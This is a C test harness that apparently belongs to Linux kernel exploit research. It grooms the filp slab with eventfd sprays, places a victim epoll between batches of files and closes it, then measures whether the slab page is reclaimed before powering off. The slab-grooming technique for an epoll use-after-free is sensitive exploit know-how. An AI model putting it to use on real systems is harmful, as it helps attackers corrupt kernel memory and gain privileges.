// test_hyp011_p0.c — HYP-011 Part 0: Reclaim Miss Root-Cause Discriminator
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <sys/resource.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/reboot.h>
#include <pthread.h>
#include <errno.h>

#define OBJS_PER_SLAB 16
#define BATCH_A_SIZE 32   // 2x OBJS_PER_SLAB
#define BATCH_B_SIZE 32   // 2x OBJS_PER_SLAB
#define BG_PRESSURE_FILES 4000

#define PR_DISCRIMINATOR_MARKER 0x1337

static void print_str(const char *s) {
    write(STDOUT_FILENO, s, strlen(s));
}

static long read_filp_slabs_count(void) {
    int fd = open("/sys/kernel/slab/filp/slabs", O_RDONLY);
    if (fd < 0) return -1;
    char buf[64] = {0};
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = '\0';
    return strtol(buf, NULL, 10);
}

void trigger_discriminator_marker(long peak_slabs, long post_drain_slabs) {
    char buf[128];
    snprintf(buf, sizeof(buf), "[HYP-011] Invoking prctl(0x%x, %ld, %ld)...\n",
             PR_DISCRIMINATOR_MARKER, peak_slabs, post_drain_slabs);
    print_str(buf);
    prctl(PR_DISCRIMINATOR_MARKER, peak_slabs, post_drain_slabs, 0, 0);
}

int main(void) {
    print_str("\n========================================================\n");
    print_str("=== HYP-011 Part 0: Root-Cause Discriminator (Sandwich) ===\n");
    print_str("========================================================\n");

    // Raise file descriptor limit
    struct rlimit rl;
    rl.rlim_cur = 8192;
    rl.rlim_max = 8192;
    if (setrlimit(RLIMIT_NOFILE, &rl) < 0) {
        perror("[-] setrlimit failed");
    }

    char buf[256];
    long initial_slabs = read_filp_slabs_count();
    snprintf(buf, sizeof(buf), "[*] Initial /sys/kernel/slab/filp/slabs = %ld\n", initial_slabs);
    print_str(buf);

    // 1. Allocate background pressure files (4000 eventfds)
    print_str("[*] Allocating background pressure files (4,000 eventfds)...\n");
    int *bg_fds = malloc(sizeof(int) * BG_PRESSURE_FILES);
    for (int i = 0; i < BG_PRESSURE_FILES; i++) {
        bg_fds[i] = eventfd(0, EFD_CLOEXEC);
        if (bg_fds[i] < 0) {
            snprintf(buf, sizeof(buf), "[-] Failed to create eventfd %d: %s\n", i, strerror(errno));
            print_str(buf);
            break;
        }
    }

    long peak_slabs = read_filp_slabs_count();
    snprintf(buf, sizeof(buf), "[*] Peak /sys/kernel/slab/filp/slabs after pressure = %ld\n", peak_slabs);
    print_str(buf);

    // 2. Allocate Tracked Batch A (32 files)
    int batch_a_fds[BATCH_A_SIZE];
    for (int i = 0; i < BATCH_A_SIZE; i++) {
        batch_a_fds[i] = open("/dev/null", O_RDONLY | O_CLOEXEC);
    }

    // 3. Allocate victim inner epoll
    int inner = epoll_create1(EPOLL_CLOEXEC);

    // 4. Allocate Tracked Batch B (32 files)
    int batch_b_fds[BATCH_B_SIZE];
    for (int i = 0; i < BATCH_B_SIZE; i++) {
        batch_b_fds[i] = open("/dev/null", O_RDONLY | O_CLOEXEC);
    }

    snprintf(buf, sizeof(buf), "[*] Sandwiched inner fd=%d between Batch A (%d fds) and Batch B (%d fds)\n",
             inner, BATCH_A_SIZE, BATCH_B_SIZE);
    print_str(buf);

    // 5. Create outer epoll epA and attach inner
    int epA = epoll_create1(EPOLL_CLOEXEC);
    struct epoll_event ev;
    ev.events = EPOLLIN | EPOLLET;
    ev.data.u64 = 0x1337;
    if (epoll_ctl(epA, EPOLL_CTL_ADD, inner, &ev) < 0) {
        perror("[-] epoll_ctl ADD inner failed");
        return 1;
    }

    // 6. Close inner file with GDB fast-path bypass simulation
    print_str("[*] Closing victim inner epoll (triggering __fput in kernel)...\n");
    close(inner);
    print_str("[*] Victim inner epoll closed.\n");

    // 7. Free Batch A, Batch B, and background pressure files
    print_str("[*] Freeing Batch A and Batch B enclosing files on victim's slab...\n");
    for (int i = 0; i < BATCH_A_SIZE; i++) {
        if (batch_a_fds[i] >= 0) close(batch_a_fds[i]);
    }
    for (int i = 0; i < BATCH_B_SIZE; i++) {
        if (batch_b_fds[i] >= 0) close(batch_b_fds[i]);
    }

    print_str("[*] Freeing background pressure files...\n");
    for (int i = 0; i < BG_PRESSURE_FILES; i++) {
        if (bg_fds[i] >= 0) close(bg_fds[i]);
    }
    free(bg_fds);

    print_str("[*] Waiting 2.0s for RCU grace period and SLUB slab release...\n");
    sleep(2);

    long post_drain_slabs = read_filp_slabs_count();
    snprintf(buf, sizeof(buf), "[*] Post-drain /sys/kernel/slab/filp/slabs = %ld (drop: %ld -> %ld, delta=%ld)\n",
             post_drain_slabs, peak_slabs, post_drain_slabs, peak_slabs - post_drain_slabs);
    print_str(buf);

    // Trigger discriminator breakpoint
    trigger_discriminator_marker(peak_slabs, post_drain_slabs);

    print_str("[*] Discriminator measurement finished. Powering off safely.\n");
    reboot(RB_POWER_OFF);
    return 0;
}
